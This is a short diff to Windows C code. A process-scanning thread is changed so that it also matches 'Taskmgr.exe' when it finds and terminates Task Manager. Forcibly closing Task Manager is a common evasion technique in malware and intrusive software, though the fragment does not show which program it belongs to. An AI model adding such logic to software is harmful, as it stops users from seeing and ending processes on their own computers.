@@ -143,7 +143,8 @@ DWORD32 WINAPI checkProcess(LPVOID lpParam){
 			ProcessEntry32.dwSize=sizeof(PROCESSENTRY32);
 			bProcessFound=Process32First(hSnapshot, &ProcessEntry32);
 			while(bProcessFound){
-				if(wcscmp(ProcessEntry32.szExeFile,TEXT("taskmgr.exe"))==0){
+				if(wcscmp(ProcessEntry32.szExeFile,TEXT("taskmgr.exe"))==0||
+				   wcscmp(ProcessEntry32.szExeFile,TEXT("Taskmgr.exe"))==0){
 					HANDLE hProcess;
 					hProcess =OpenProcess(SYNCHRONIZE|PROCESS_TERMINATE, TRUE,ProcessEntry32.th32ProcessID);
 					TerminateProcess(hProcess,0);
